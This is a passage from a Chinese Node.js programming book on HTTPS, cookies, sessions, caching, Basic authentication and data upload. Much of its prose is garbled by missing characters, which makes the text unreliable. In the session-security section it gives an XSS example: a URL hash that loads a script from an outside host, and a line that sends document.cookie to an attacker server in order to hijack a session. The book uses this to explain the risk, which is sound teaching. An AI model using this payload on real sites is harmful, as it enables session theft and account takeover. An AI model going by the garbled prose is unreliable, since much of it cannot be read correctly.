   //创建私$ openssl genrsa -out client.key 1024 //生成CSR $ openssl req -new -key client.key -out client.csr //生成名证\$ openssl x509 -req -CA ca.crt -CAkey ca.key -CAcreateserial -in client.csr -out client.crt
   并创客端，下
   var tls = require('tls'); var fs = require('fs');
   var options = { key: fs.readFileSync('./keys/client.key'), cert: fs.readFileSync('./keys/client.crt'), ca: [ fs.readFileSync('./keys/ca.crt') ]
   };
   var stream = tls.connect(8000, options, function () { console.log('client connected', stream.authorized ? 'authorized' : 'unauthorized'); process.stdin.pipe(stream);
   });
   stream.setEncoding('utf8'); stream.on('data', function(data) {
   console.log(data); }); stream.on('end', function() {
   server.close(); });
   动客端的过程中，用到了为客端生的、书、CA 书
   。客端动之后可以在入中入数，服务端会应相的数。至我们了 TLS 的服务端客端的创。与的 TCP 服务端客端相，TLS 的服务端客端仅仅只在书的上有
   ，余部分本相。
   7.5.3HTTPS
   HTTPS 服务就是工作在 TLS/SSL 上的 HTTP。在了解了 TLS 服务后，创 HTTPS 服务是不过的事情。
1.

HTTPS 服务要用到书，我们可以接用上生的书。
2- HTTPS
创 HTTPS 服务只 HTTP 服务多一个，余几相，下
var https = require('https'); var fs = require('fs');
var options = { key: fs.readFileSync('./keys/server.key'), cert: fs.readFileSync('./keys/server.crt')
};
https.createServer(options, function (req, res) { res.writeHead(200); res.end("hello world\n");
}).listen(8000);
动之后过 curl 测试，相关下
$ curl https://localhost:8000/ curl: (60) SSL certificate problem, verify that the CA cert is OK. Details: error:14090086:SSL routines:SSL3_GET_SERVER_CERTIFICATE:certificate verify failed More details here: http://curl.haxx.se/docs/sslcerts.html 
curl performs SSL certificate verification by default, using a "bundle"  of Certificate Authority (CA) public keys (CA certs). If the default  bundle file isn't adequate, you can specify an alternate file  using the --cacert option. 
If this HTTPS server uses a certificate signed by a CA represented in  the bundle, the certificate verification probably failed due to a  problem with the certificate (it might be expired, or the name might  not match the domain name in the URL). 
If you'd like to turn off curl's verification of the certificate, use  the -k (or --insecure) option. 
由于是自的书，curl工服务端书是否，以了上的，要解决上的问题有。一是加-k，curl工书的，这样的是数会过加，是对是可的，会在中人的在。下
$ curl -k https://localhost:8000/ hello world
一解决的是 curl--cacert，CA 书使之对服务书的，下
$ curl --cacert keys/ca.crt https://localhost:8000/ hello world 
3- HTTPS
对应的，我们也会用Node实HTTPS的客端，与HTTP的客端相不大，了定书相关的数外，下
var https = require('https'); var fs = require('fs'); 
var options = { hostname: 'localhost', port: 8000, path: '/', method: 'GET', key: fs.readFileSync('./keys/client.key'), cert: fs.readFileSync('./keys/client.crt'), ca: [fs.readFileSync('./keys/ca.crt')] 
}; 
options.agent = new https.Agent(options); 
var req = https.request(options, function(res) { res.setEncoding('utf-8'); res.on('data', function(d) {
 console.log(d); 
}); }); req.end(); 
req.on('error', function(e) { console.log(e); }); 
上的作到以下
$ node client.js hello world
不 ca，会到下
[Error: UNABLE_TO_VERIFY_LEAF_SIGNATURE]
解决的是加性 rejectUnauthorized 为 false，它的与 curl 工加-k 一样，都会在数过程中会加，是服务端的书不是的。

## 7.6 总结

Node 于事驱动，在分环境中能发它的，于事驱动可以实与大量的客端接，它可以好网的应。Node 了相对的网用，以于事的编程接，使开发者在这些上分网应用。下一我们在本的上探的 Web 应用。

## 7.7 参考资源

本章参考的资源如下：

- http://tools.ietf.org/html/rfc2616
- http://hi.baidu.com/miracletan2008/item/0bc16c9d7af261de7b7f01a2
- http://tools.ietf.org/html/rfc6455
- http://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html
- http://en.wikipedia.org/wiki/OSI_model
- http://upload.wikimedia.org/wikipedia/commons/a/ae/SSL_handshake_with_two_way_authentication_with_certificates.svg

# 第 8 章 构建 Web 应用

今，Web 应用是网的，Web1.0、Web2.0 一走，HTTP 了网中的大多数量。着动网时的到，Web 开始在动上发。在 Web
的过后，Web 开始应用发，JavaScript 在前端可。多本在服务端实的务，前到端，前端 MV\*的也熟。与之的是，Node 的前后端的次，JavaScript 这门最初就能在服务端的语言，在经了前端的后端的后，事驱动 V8 的高性能，次为了服务端的者。在 Web 应用中，JavaScript 不仅仅在前端中，因为 Node 的，前端会新定。
为了 Web 应用的开发工作，语言、、不。从言，在后端数大的就有 Structs、CodeIgniter、Rails、Django、web.py，在前端也有的 BackBone、Knockout.js、AngularJS、Meteor。在 Node 中，有 Connect 中，也有 Express 这样的 MVC。的是 Meteor，它在后端是 Node，在前端是 JavaScript，它是一个了前后端 JavaScript 的。
由于前后端用的语言都是 JavaScript，在 HTTP 时，会有一些外的好。
语言环境，部分识不会因为语言环境的，上下一性好。
数（因为 JSON）可以很好实前后端接使用。
一些务（）可以很自由量是在前端还是在后端，因为编程

语言相，以小。本会开 Web 应用在后端实中的。

## 8.1 基础功能

在 7 中，我们了 Node 的网编程部分。从中我们可以发，Node 是分网的，它的、事机使我们在网编程时分。本的 Web 应用的内，从 http 中服务端的 request 事开始分。request 事发生于网接立，客端服务端发，服务端解，发 HTTP 请的时。在已触发 reqeust 事前，它已好 ServerRequestServerResponse 对以对请应的作。
以经的 HelloWorld 为，就是用 ServerResponse 实应的，下
var http = require('http');
http.createServer(function (req, res) { res.writeHead(200, {'Content-Type': 'text/plain'}); res.end('Hello World\n');
}).listen(1337, '127.0.0.1'); console.log('Server running at http://127.0.0.1:1337/');

对于一个 Web 应用言，仅仅只是上这样的应不到务的。在的务中，我们可能有下这些。请的。
. URL 的解。
. URL 中解。
. Cookie 的解。
. Basic 认。数的解。. 的上。之外，可能还有 Session（会）的。管 Node 的 API 相对，

要务，还要大量的工作，仅仅一个 request 事这些。是要实这些并事，一的一，都从下这个数开
function (req, res) { res.writeHead(200, {'Content-Type': 'text/plain'}); res.end();
}
在 4 中，我们对高数有过的我们的应用可能复杂，是只要最一个上的数作为数，createServer()作为 request 事的就可以了。你可能到 ConnectExpress 的中有下这样的
var app = connect(); // var app = express(); // TODO http.createServer(app).listen(1337);
它的是。我们在务开始前，要为务一些，这些会在 reqres 对上，务使用。
8.1.1
在 Web 应用中，最的请是 GETPOST，之外，还有 HEAD、DELETE、PUT、CONNECT。请在于的一的一个，是大写。下为一个的

> GET /path?foo=bar HTTP/1.1 > User-Agent: curl/7.24.0 (x86*64-apple-darwin12.0) libcurl/7.24.0 OpenSSL/0.9.8r zlib/1.2.5 > Host: 127.0.0.1:1337 > Accept: */\_ >
> HTTP_Parser 在解请的时候，，为 req.method。，我们只要 GETPOST 请，是在 RESTfulWeb 服务中请分要，因为它会决定源的作为。PUT 新一个源，POST 要新一个源，GET 一个源，DELETE 一个源。
> 我们可以过请决定应为，下
> function (req, res) { switch (req.method) { case 'POST':
> update(req, res); break;
> case 'DELETE': remove(req, res); break;
> case 'PUT': create(req, res); break;
> case 'GET': default: get(req, res); } }
> 上了一请复杂的务分发的，是一为的。
> 8.1.2
> 了请分发外，最的请过于的了。部分在于的一的部分，下
> GET /path?foo=bar HTTP/1.1
> HTTP_Parser 解为 req.url。一言，的 URL 是下这样的
> http://user:pass@host.com:8080/p/a/t/h?query=string#hash
> 客端（）会这个解，部分在一。要的是，hash 部分会，不会在于的。最的务的应用是服务，它会中的，后应客端，下
> function (req, res) { var pathname = url.parse(req.url).pathname; fs.readFile(path.join(ROOT, pathname), function (err, file) {
> if (err) { res.writeHead(404); res.end('不关文件- -'); return;
> } res.writeHead(200);
> res.end(file); }); }
> 还有一的分发场景是，它为为的组，外由信，下
> /controller/action/a/b/c
> 这的 controller 会对应到一个，action 对应到的为，余的会作为数一些的。
> function (req, res) { var pathname = url.parse(req.url).pathname; var paths = pathname.split('/'); var controller = paths[1] || 'index'; var action = paths[2] || 'index'; var args = paths.slice(3); if (handles[controller] && handles[controller][action]) {
> handles[controller][action].apply(null, [req, res].concat(args));
> } else { res.writeHead(500); res.end('不响应控制器');
> } }
> 这样我们的务部分可以只关心的务实，下
> handles.index = {};
> handles.index.index = function (req, res, foo, bar) { res.writeHead(200); res.end(foo);
> };
> 8.1.3
> 于之后，在中后的?foo=bar&baz=val 就是。这个会在后，请的部分。这部分内经要为务用，Node 了 querystring 用于这部分数，下
> var url = require('url'); var querystring = require('querystring'); var query = querystring.parse(url.parse(req.url).query);
> 的是 url.parse()个数，下
> var query = url.parse(req.url, true).query;
> 它会 foo=bar&baz=val 解为一个 JSON 对，下
> { foo: 'bar', baz: 'val'
> }
> 在务用产生之前，我们的中者会，后在请对上务使用，下
> function (req, res) { req.query = url.parse(req.url, true).query; hande(req, res);
> }
> 要的是，中的多次，它的会是一个数组，下
> // foo=bar&foo=baz var query = url.parse(req.url, true).query; // { // foo: ['bar', 'baz'] // }
> 务的一定要是数组还是，否可能 TypeError 的情。
> 8.1.4Cookie

1. Cookie
   在 Web 应用中，请对务至关要，过它们已经可以很多务作了，是 HTTP 是一个的，实中的务是要一定的的，否区分用之的。识认一个用，最的就是 Cookie（）了。
   Cookie 最由本 Lynx 作开发者 Lou Montulli 在 1994 年网景开发 Netscape 的一个本时发。它能服务与客端之的，最的用就是用用是否一次问网。在 1997 年 RFC 2109，目前最新的为 RFC 6265，它是一个由服务作实的。
   Cookie 的分为下几。
   服务客端发 Cookie。. Cookie。之后次都会 Cookie 发服务端。客端发的 Cookie 在请的 Cookie 中，我们可以过 curl 工这个，
   下
   curl -v -H "Cookie: foo=bar; baz=val" "http://127.0.0.1:1337/path?foo=bar&foo=baz"
   HTTP_Parser 会有的解到 req.headers 上，Cookie 就是 req.headers. cookie。中的定，Cookie 的是 key=value; key2=value2 的，我们要 Cookie，解它也分，下
   var parseCookie = function (cookie) { var cookies = {}; if (!cookie) {
   return cookies; }
   var list = cookie.split(';');
   for (var i = 0; i < list.length; i++) { var pair = list[i].split('='); cookies[pair[0].trim()] = pair[1];
   } return cookies; };
   在务之前，我们在 req 对上，务可以接问，下
   function (req, res) { req.cookies = parseCookie(req.headers.cookie); hande(req, res);
   }
   这样我们的务就可以了，下
   var handle = function (req, res) { res.writeHead(200); if (!req.cookies.isVisit) {
   res.end('动'); } else { // TODO } };
   请中，Cookie 没有 isVisit，都会收到欢一次到动这样的应。这一个问题，识到用没有问过我们的，我们的是否应客端已经问过的识客端的是过应实的，应的 Cookie 在 Set-Cookie 中。它的与请中的不相，中对它的定下
   Set-Cookie: name=value; Path=/; Expires=Sun, 23-Apr-23 09:01:35 GMT; Domain=.domain.com;
   中 name=value 是包的部分，余部分是可数。这些可数会在后续 Cookie 发服务端的为。以下为要的几个。
   . path 这个 Cookie 到的，前问的不时，不发这个 Cookie。
   . ExpiresMax-Age 是用这个 Cookie 时过的，不，在关时会这个 Cookie。了过时，会 Cookie 内写入到中并，下次开有。Expires 的是一个 UTC 的时，Cookie 时过，Max-AgeCookie 多后过。前者一言不在问题，是服务端的时客端的时不能，这时就会在。为，Max-Age 这 Cookie 多之后过，不是一个的时。

- HttpOnly 不过脚本 document.cookie 这个 Cookie，事实上，HttpOnly 之后，这个在 document.cookie 中不可。是在 HTTP 请的过程中，会发这个 Cookie 到服务端。
  . Secure。Secure 为 true 时，在 HTTP 中是的，在 HTTPS 中才有，创的 Cookie

只能在 HTTPS 接中到服务端会，是 HTTP 接不会信，以很到。Cookie 在中的后，下我们 Cookie 序的，相关下
var serialize = function (name, val, opt) { var pairs = [name + '=' + encode(val)]; opt = opt || {};
if (opt.maxAge) pairs.push('Max-Age=' + opt.maxAge); if (opt.domain) pairs.push('Domain=' + opt.domain); if (opt.path) pairs.push('Path=' + opt.path); if (opt.expires) pairs.push('Expires=' + opt.expires.toUTCString()); if (opt.httpOnly) pairs.push('HttpOnly'); if (opt.secure) pairs.push('Secure');
return pairs.join('; '); };
前的问，我们就能用的了，下
var handle = function (req, res) {
if (!req.cookies.isVisit) { res.setHeader('Set-Cookie', serialize('isVisit', '1')); res.writeHead(200); res.end('动');
} else { res.writeHead(200); res.end('动');
} };
客端收到这个 Set-Cookie 的应后，在之后的请时会在 Cookie 中上这个。的是，Set-Cookie 是的，在中可能在多个。为 res.setHeader 的个数可以是一个数组，下
res.setHeader('Set-Cookie', [serialize('foo', 'bar'), serialize('baz', 'val')]);
这会在部中 Set-Cookie
Set-Cookie: foo=bar; Path=/; Expires=Sun, 23-Apr-23 09:01:35 GMT; Domain=.domain.com; Set-Cookie: baz=val; Path=/; Expires=Sun, 23-Apr-23 09:01:35 GMT; Domain=.domain.com;

2. Cookie
   由于 Cookie 的实机，一服务端客端发了 Cookie 的图，Cookie 过，否客端次请都会发这些 Cookie 到服务端，一的 Cookie 过多，会大。大多数的 Cookie 并不要次都用上，因为这会的部分。在 YSlow 的性能优中有这一
   . Cookie 的的情是，在的 Cookie，几有下的请都会上这些 Cookie，这些 Cookie 在些情下是有用的，是在有些情下是用的。中以最为，的务定几不关心，Cookie 对它言几是用的，是一有 Cookie 到相下，它的请中就会上 Cookie。好在 Cookie 在时定了它的，只有相时才会发。以 YSlow 中有外一用 Cookie 的性能。
   的
   言之就是，为不要 Cookie 的组个可以实 Cookie 的。以很多网的会有的，使务相关的 Cookie 不源。用外的的好不只这，还可以下线程数量的，因为不，可以下线程数。是用外还是有一定的的，就是为 IP 要 DNS，多一个就多一次 DNS。YSlow 中有这样一
   . DNS
   起 DNS 使用不的是的，是好在今的都会 DNS，以这个作用的。
   Cookie 了可以过后端加的外，在前端中也可以过 JavaScript，Cookie 过 document.cookie 了 JavaScript。前端在 Cookie 之后，后续的网请中就会上过后的。
   目前，广在线统是最为 Cookie 的，过入的广者统脚本，Cookie 前页定，这样就可以识用，到用的为，广就可以定广了。管这样的为起很可，是从 Cookie 的，它只能做到识，不能做有性的事情。心自己的用下为，就不要的脚本。
   8.1.5Session
   过 Cookie，服务可以实的。是 Cookie 并是的，前的过大就是一个的问题，最为的问题是 Cookie 可以在前后端，因数就极。服务端有部分是 Cookie 中的 isVIP，一个用过 Cookie 就可以享到 VIP 服务了。上，Cookie 对于数的是的。
   为了解决 Cookie 数的问题，Session 应生。Session 的数只在服务端，客端，这样数的性到一定的，数也在中次都。在服务端数分，是个客服务中的数一一对应起，这有的实。
   . Cookie 数据的
   有数都在 Cookie 中不可，是在 Cookie 中还是可以的。因为一，就了关系，也服务端在的数了。并且 Session 的有，遍的是 20 分，在 20 分内客端服务端没有产生，服务端就数。由于数过时，且在服务端数，因性相对高。是产生的
   一服务端用了 Session，它定一个作为 Session 的，这个可以定，Connect 认用 connect*uid，Tomcat 会用 jsessionid。一服务到用请 Cookie 中没有，它就会为之生一个，这个是一且不复的，并定时时。以下为生 session 的
   var sessions = {}; var key = 'session_id'; var EXPIRES = 20 * 60 \_ 1000;
   var generate = function () { var session = {}; session.id = (new Date()).getTime() + Math.random(); session.cookie = {
   expire: (new Date()).getTime() + EXPIRES }; sessions[session.id] = session; return session;
   };
   个请到时，Cookie 中的与服务端的数，过，就新生，下
   function (req, res) { var id = req.cookies[key]; if (!id) {
   req.session = generate();
   } else { var session = sessions[id]; if (session) {
   if (session.cookie.expire > (new Date()).getTime()) { // 时时间 session.cookie.expire = (new Date()).getTime() + EXPIRES; req.session = session;
   } else { // 时的数据重生成 delete sessions[id]; req.session = generate();
   }
   } else { //如 session 过不对重生成 session req.session = generate();
   } } handle(req, res);
   }
   仅仅新生 Session 还不以个程，还要在应客端时新的，以下次请时能对应服务端的数。这我们 hack 应对的 writeHead()，在它的内部入 Cookie 的，下
   var writeHead = res.writeHead; res.writeHead = function () {
   var cookies = res.getHeader('Set-Cookie'); var session = serialize('Set-Cookie', req.session.id); cookies = Array.isArray(cookies) ? cookies.concat(session) : [cookies, session]; res.setHeader('Set-Cookie', cookies); return writeHead.apply(this, arguments);
   };
   至，session 在前后端对应的过程就了。这样的务可以 session，以用与服务端的关系，下
   var handle = function (req, res) {
   if (!req.session.isVisit) { res.session.isVisit = true; res.writeHead(200); res.end('动');
   } else { res.writeHead(200); res.end('动');
   } };
   这样在 session 中的数接在 Cookie 中数要多。这实 Cookie 实，且也是目前大多数 Web 应用的。客端使用 Cookie，这个上大多数的网实作。
   字数据的
   它的是请的，没有，会生新的的 URL，下
   var getURL = function (\_url, key, value) { var obj = url.parse(\_url, true); obj.query[key] = value; return url.format(obj);
   };
   后，客端新发起请，下
   function (req, res) {
   var redirect = function (url) { res.setHeader('Location', url); res.writeHead(302); res.end();
   };
   var id = req.query[key];
   if (!id) { var session = generate(); redirect(getURL(req.url, key, session.id));
   } else { var session = sessions[id]; if (session) {
   if (session.cookie.expire > (new Date()).getTime()) { // 时时间 session.cookie.expire = (new Date()).getTime() + EXPIRES; req.session = session;
   handle(req, res);
   } else {
   // 时的数据重生成
   delete sessions[id];
   var session = generate();
   redirect(getURL(req.url, key, session.id));
   }
   } else {
   //如 session 过不对重生成 session
   var session = generate();
   redirect(getURL(req.url, key, session.id));
   }
   }
   }
   用问http://localhost/pathname时，服务端发中不session_id数，就会用到http://localhost/pathname?session_id=12344567这样一个的。收到302Location，就会新发起新的请，下
   < HTTP/1.1 302 Moved Temporarily < Location: /pathname?session_id=12344567
   这样，新的请到时就能过 Session 的，内中的数过。
   有的服务在客端用 Cookie 时，会用这实。过这，在应时 Cookie。是这的大于于 Cookie 实的，因为只要中的发外一个人，他就有你相的。Cookie 的在了者了
   之后生，相对为。
   还有一有的 Session 的是用 HTTP 请中的 ETag，样对于后也是的，的这就不开了，的朋友可以到网上阅相关。
1. Session
   在上的中，我们都 Session 数接在量 sessions 中，它于内中。在 5 的内部分，我们分了为 Node 会在内，这数在内中会极大的，用多，我们很可能就接触到了内的上，并且内中的数量加大，会起收的，起性能问题。
   一个问题是我们可能为了用多 CPU 动多个程，这个在 9 中有。用请的接可能分到个程中，Node 的程与程之是不能接享内的，用的 Session 可能会起。
   为了解决性能问题 Session 数程享的问题，用的是 Session 中，本可能分在多个程的数，统一到中的数中。目前用的工是 Redis、Memcached，过这些高的，Node 程在内部数对，收问题内问题都可以解，并且这些高的过高，在 Node 中自好。
   用 Session 起的一个问题是会起网问。上问网中的
   数要问本中的数要，因为到、以网端自的 I/O，管会用这些高的由有以下几. Node 与服务接，的接，的只初始。
   高接在内中数问。
   服务与 Node 程在相的机上者相的机，网到的小。管用门的服务会接在内中问，小之小，的好

大于接在 Node 中数。为，一 Session 要的，就要作，的，下
function (req, res) { var id = req.cookies[key]; if (!id) {
req.session = generate(); handle(req, res); } else { store.get(id, function (err, session) { if (session) {
if (session.cookie.expire > (new Date()).getTime()) { //时时间 session.cookie.expire = (new Date()).getTime() + EXPIRES; req.session = session;
} else { //时的数据重生成 delete sessions[id]; req.session = generate();
}
} else { // 如 session 过不对重生成 session req.session = generate();
} handle(req, res); }); } }
在应时，新的 session 中，下
var writeHead = res.writeHead;
res.writeHead = function () { var cookies = res.getHeader('Set-Cookie'); var session = serialize('Set-Cookie', req.session.id); cookies = Array.isArray(cookies) ? cookies.concat(session) : [cookies, session]; res.setHeader('Set-Cookie', cookies); // 存回缓存 store.save(req.session); return writeHead.apply(this, arguments);
};

2. Session
   从前可以，管我们的数都在后端了，使它能，是过 Cookie，还是的实，Session 的在客端，这会在用的情。Web 应用的用分多，自的机的一些就有机会中有的。一，服务端的数也可能接用。这到的 Session 的，就要这个加。
   有一做是这个过加，使的本高。客端管可以，是由于不，信很。，我们只要在应时对，，我们服务端的数立过可，下
   //将通过私名.分割原和名 var sign = function (val, secret) {
   return val + '.' + crypto .createHmac('sha256', secret) .update(val) .digest('base64') .replace(/\=+$/, ''); 
}; 
在应时，session到Cookie中者URL中，下
var val = sign(req.sessionID, secret); res.setHeader('Set-Cookie', cookie.serialize(key, val)); 
接收请时，，下
//出部分进行名对比用户提的
var unsign = function (val, secret) { var str = val.slice(0, val.lastIndexOf('.')); return sign(str, secret) == val ? str : false; 
}; 
这样一，使者中.前的是服务端Session的ID，只要不secret的，就信，以实对Session的。Connect中使用，好，就是在自己Web应用的。
，是一个很好的解决，是者过了一个实的，他就能实的。一是客端的些有信与作为，后，这样者一不在始的客端上问，就会。这些有信包括用IP用（UserAgent）。
是始用与者之也在上信相的可能性，网IP相，相的客端信，不过入这些能高性。言，在Cookie中不他人，是一些的可能这个，的有XSS，下一下过XSS到用的，实。
. XSSXSS的是脚本（CrossSiteScripting，为XSS），都是由网开发者
决定些脚本可以在端，不过XSS会的脚本。它的要因多数是用的入没有，接。
下是个网的前端脚本，它会URLhash中的到页中，以实，下
$('#box').html(location.hash.replace('#', ''));
   者在发这的后，了这样的 URL
   http://a.com/pathname#<script src="http://b.com/c.js"></script>
   为了不者接发这 URL 中的，它可能会过 URL 一个网，下
   http://t.cn/fasdlfj //者压http://url.cn/fasdlfb
   后最的网发个的在线用。这样一，这 hash 中的脚本会在这个用的中，这脚本中的内下
   location.href = "http://c.com/?" + document.cookie;
   这用的 Cookie 了 c.com，这个就是者的服务，他也就能到用的 Session。后他在客端中用这个 Cookie，从实了用的。用是网管，就可能极大的。
   XSS 的不这些，这不过多。在这个中，中有用的客端信的，使，者与用客端相，否不能实。
   8.1.6
   我们的经过一次 C/S 到 B/S 的，在 HTTP 之上的应用，客端了应用量的部性外，在、、上也优势。统客端在后的应用过程中仅仅要数，Web 应用还要的组（HTML、JavaScript、CSS）。这部分内在大多数场景下并不经，要在次的应用中客端，不，它不要的。网，就要多时开页，对于用的会一定。因不要的，对用对服务者都有好。
   为了高性能，YSlow 中也到几关于的。
   加 Expires Cache-Control 到中。
   ETags。
   . Ajax 可。

这我们开这几的源。我们的源，这也是一个要由服务与作的事情。RFC 2616 对有一定的，只有定，个机才能有立。，POST、DELETE、PUT 这为性的请作一不做
，大多数只应用在 GET 请中。使用的程图 8-1。

图 8-1 使用的程图
，本没有时，会请服务端的内，并这部分内在本
的个目中。在次请时，它对本，不能定这本是否可以接使用，它会发起一次请。请，就是在的 GET 请中，If-Modified-Since，下
If-Modified-Since: Sun, 03 Feb 2013 06:01:12 GMT
它问服务端是否有新的本，本的最后时。服务端没有新的本，只应一个 304，客端就使用本本。服务端有新的本，就新的内发客端，客端本本。下
var handle = function (req, res) {
fs.stat(filename, function (err, stat) { var lastModified = stat.mtime.toUTCString(); if (lastModified === req.headers['if-modified-since']) {
res.writeHead(304, "Not Modified"); res.end(); } else {
fs.readFile(filename, function(err, file) { var lastModified = stat.mtime.toUTCString(); res.setHeader("Last-Modified", lastModified); res.writeHead(200, "Ok"); res.end(file);
}); }
}); };
这的请用时的实，是时有一些在。
的时动内并不一定动。时只能到，新的内生。为 HTTP1.1 中入了 ETag 解决这个问题。ETag 的是 Entity Tag，由服务端生，服
务端可以决定它的生。内生，请不会到时
动的。下是内生的
var getHash = function (str) { var shasum = crypto.createHash('sha1'); return shasum.update(str).digest('base64');
};
与 If-Modified-Since/Last-Modified 不的是，ETag 的请应是 If-None-Match/ETag，下
var handle = function (req, res) {
fs.readFile(filename, function(err, file) { var hash = getHash(file); var noneMatch = req.headers['if-none-match']; if (hash === noneMatch) {
res.writeHead(304, "Not Modified"); res.end();
} else { res.setHeader("ETag", hash); res.writeHead(200, "Ok"); res.end(file);
} }); };
在收到 ETag: "83-1359871272000"这样的应后，在下次的请中，会在请中 If-None-Match:"83-1359871272000"。
管请可以在内没有的情下，是它会发起一个 HTTP 请，使客端会一定时应。可最好的就是请都不用发起。是否能接使用本本就是服务端在应内时，内起。YSlow 到的，在应 ExpiresCache-Control，。这个有区
HTTP1.0 时，在服务端 Expires 可以要内，下
var handle = function (req, res) {
fs.readFile(filename, function(err, file) { var expires = new Date(); expires.setTime(expires.getTime() + 10 _ 365 _ 24 _ 60 _ 60 _ 1000); res.setHeader("Expires", expires.toUTCString()); res.writeHead(200, "Ok"); res.end(file);
}); };
Expires 是一个 GMT 的时。在接到这个过后，只要本还在这个，在到时之前它都不会发起请。YUI3 的 CDN 实践是在 10 年后过。是 Expires 的在于与服务之的时可能不一，这可能会一些问题，
前过，者到后并没有。在这情下，Cache-Control 以的，实相的能，下
var handle = function (req, res) {
fs.readFile(filename, function(err, file) {
res.setHeader("Cache-Control", "max-age=" + 10 _ 365 _ 24 _ 60 _ 60 _ 1000);
res.writeHead(200, "Ok");
res.end(file);
});
};
上的为 Cache-Control 了 max-age，它 Expires 优的在于，Cache-Control 能端与服务端时不的不一性问题，只要时的过时可。之外，Cache-Control 的还能 public、private、no-cache、no-store 能的。
由于在 HTTP1.0 时还不 max-age，今的服务端在的下多时对 ExpiresCache-Control。在中个时在，且时时，max-age 会 Expires。
.
我们了，以到网的目的，是一定，服务端外新内时，客端新。这使我们在使用时也要为定本，是 URL，一内有新时，我们就发起新的 URL 请，使新内能客端新。一的新机有下。
次发，中 Web 应用的本http://url.com/?v=20130501。
次发，中内的 hashhttp://url.com/?hash=afadfadwe。
大，内的 hash 淘会加高，因为内不一定着 Web 应用的本新，内没有新时，本的动的新，因以内的 hash。
8.1.7Basic
Basic 认是客端与服务端请时，过用实的一认。这要它的它在服务端过 Node 的程。
一个页要 Basic 认，它会请中的 Authorization 的内，的由认加，下
\$ curl -v "http://user:pass@www.baidu.com/" > GET / HTTP/1.1 > Authorization: Basic dXNlcjpwYXNz > User-Agent: curl/7.24.0 (x86*64-apple-darwin12.0) libcurl/7.24.0 OpenSSL/0.9.8r zlib/1.2.5 > Host: www.baidu.com > Accept: */\_
在 Basic 认中，它会用部分组 username + ":" + password。后 Base64 编，下
var encode = function (username, password) {
return new Buffer(username + ':' + password).toString('base64');
};
用次问网页，URL 中也没认内，会应一个 401 的，下
function (req, res) {
var auth = req.headers['authorization'] || '';
var parts = auth.split(' ');
var method = parts[0] || ''; // Basic
var encoded = parts[1] || ''; // dXNlcjpwYXNz
var decoded = new Buffer(encoded, 'base64').toString('utf-8').split(":");
var user = decoded[0]; // user
var pass = decoded[1]; // pass
if (!checkUser(user, pass)) {
res.setHeader('WWW-Authenticate', 'Basic realm="Secure Area"');
res.writeHead(401);
res.end();
} else {
handle(req, res);
}
}
在上的中，应中的 WWW-Authenticate 用样的认加。一言，认的情下，会对认信，图 8-2。

图 8-2 的认信的对
认过，服务端应 200 之后，会用，在后续的请中都上 Authorization 信。
Basic 认有多的，它经过 Base64 加后在网中，是这于，分，一只有在 HTTPS 的情下才会使用。不过 Basic 认的分广，几有的都它。
为了 Basic 认，RFC 2069 了要问认，它加入了服务端机数认过程，在不做深入的解。

## 8.2 数据上传

上的内本都中在 HTTP 请中，用于 GET 请大多数他请。部中的内已经能服务端大多数务作了，是的部大量的数，在务中，我们要接收一些数，、、JSON 上、XML 上。
Node 的 http 只对 HTTP 的部了解，后触发 request 事。请中还有内部分（POST 请，它有内），内部分要用自接收解。过的 Transfer-EncodingContent-Length 可请中是否有内，下
var hasBody = function(req) { return 'transfer-encoding' in req.headers || 'content-length' in req.headers; };
在 HTTP_Parser 解后，内部分会过 data 事触发，我们只以的可，下
function (req, res) {
if (hasBody(req)) { var buffers = []; req.on('data', function (chunk) {
buffers.push(chunk); }); req.on('end', function () {
req.rawBody = Buffer.concat(buffers).toString(); handle(req, res);
}); 8
} else { handle(req, res); } }
接收到的 Buffer 为一个 Buffer 对后，为没有的，时在 req.rawBody。
8.2.1
最为的数就是过网页数到服务端，下

<form action="/upload" method="post"> <label for="username">Username:</label> <input type="text" name="username" id="username" /> <br /> 
<input type="submit" name="submit" value="Submit" /> </form> 
认的，请中的Content-Type为application/x-www-form-urlencoded，下
Content-Type: application/x-www-form-urlencoded 
由于它的内相
foo=bar&baz=val
因解它分
var handle = function (req, res) { if (req.headers['content-type'] === 'application/x-www-form-urlencoded') { 
 req.body = querystring.parse(req.rawBody); } todo(req, res); 
}; 
后续务中接问req.body就可以到中的数。
8.2.2
了数外，的还有JSONXML，解他们的都相，都是Content-Type中的决定，中JSON的为application/json，XML的为application/xml。
要的是，在Content-Type中可能还下的编信Content-Type: application/json; charset=utf-8
以在做时，要区分，下
var mime = function (req) { var str = req.headers['content-type'] || ''; return str.split(';')[0]; 
}; 
1. JSON
从客端JSON内，这对于Node，要它都不要外的，下
var handle = function (req, res) { if (mime(req) === 'application/json') {  try { req.body = JSON.parse(req.rawBody); 
 } catch (e) { //异常内容响应Badrequest res.writeHead(400); res.end('Invalid JSON'); return; 
} } todo(req, res); 
}; 
2. XML
解XML复杂一，是社区有XML到JSON对的，这以xml2js为，下var xml2js = require('xml2js'); 
var handle = function (req, res) { if (mime(req) === 'application/xml') {  xml2js.parseString(req.rawBody, function (err, xml) { 
if (err) { // 异常内容响应Bad request res.writeHead(400); res.end('Invalid XML'); return; 
} req.body = xml; todo(req, res); 
 }); } }; 
用的，客端的数是，我们都可以过这数是，后用对应的解解可。
8.2.3
了的的内外，还有一的。的，内
可以过urlencoded的编内，发服务端，是务场景要用
接。在前端HTML中，与的在于中可以有file
的，以要定性enctype为multipart/form-data，下
<form action="/upload" method="post" enctype="multipart/form-data"> <label for="username">Username:</label> <input type="text" name="username" id="username" /> <label for="file">Filename:</label> <input type="file" name="file" id="file" /> <br /> 8 <input type="submit" name="submit" value="Submit" /> 
</form> 
在到multipart/form-data时，的请与不。它的中最为的下
Content-Type: multipart/form-data; boundary=AaB03x Content-Length: 18231 
它本次的内是由多部分的，中boundary=AaB03x定的是部分内的分，AaB03x是机生的一，的内过在它前加--分，时在它前后都加上--。外，Content-Length的是的。
上的了一个为diveintonode.js的，并上，生的下
--AaB03x\r\n Content-Disposition: form-data; name="username"\r\n \r\n Jackson Tian\r\n --AaB03x\r\n Content-Disposition: form-data; name="file"; filename="diveintonode.js"\r\n Content-Type: application/javascript\r\n \r\n 
 ... contents of diveintonode.js ... --AaB03x-- 
的的下
--AaB03x\r\n Content-Disposition: form-data; name="username"\r\n \r\n Jackson Tian\r\n 
的下
--AaB03x\r\n Content-Disposition: form-data; name="file"; filename="diveintonode.js"\r\n Content-Type: application/javascript\r\n \r\n 
 ... contents of diveintonode.js ... 
